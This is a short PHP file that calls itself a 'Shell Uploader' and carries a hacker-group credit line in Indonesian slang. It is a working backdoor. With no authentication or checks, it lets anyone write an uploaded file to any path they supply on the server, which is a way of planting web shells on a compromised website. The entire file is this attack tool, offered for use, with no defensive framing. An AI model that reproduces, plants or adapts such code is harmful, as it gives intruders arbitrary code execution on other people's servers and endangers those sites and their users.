<?php

$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>Lanjakelah Bos!</a></h1>";
    }
}echo '<html><head><title>Shell Uploader By Muaratara6etar</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Tembak Bos"></form></body></html>';
?>
<center><font color=red size=3 face=courier new>Muratara63tar - Muratara_cyber</font></center>
